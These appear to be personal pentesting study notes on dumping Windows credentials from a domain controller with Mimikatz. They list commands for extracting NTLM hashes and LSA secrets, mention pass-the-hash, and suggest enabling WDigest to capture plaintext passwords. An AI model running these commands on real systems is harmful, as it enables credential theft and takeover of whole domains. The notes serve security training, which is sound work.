Cred Dumping with Mimikatz

* From the DC
## Commands 
* first thing to do privilege::debug 
	* if it says privilege '20' OK then your good
* sekurlsa::logonpasswords 
	* shows username, ntlm hash, and anyone who logs on to this machine 
	* you can use the pass the hash feature if you get a DC hash 
	* could give you a domain admins hash 
* wdigest - stores passwords in plain text in windows 7 and before 
	* you could turn it on in windows 10 and then you wait for someone to log onto the computer and you get a plain text password 
* lsadump::sam
	* might not work 
* lsadump::lsa /patch 
	* patch is important becuase it allows us to actually get the info we need 
	* lsa - local security authority 
		* authenticates and creates logons for the local computer 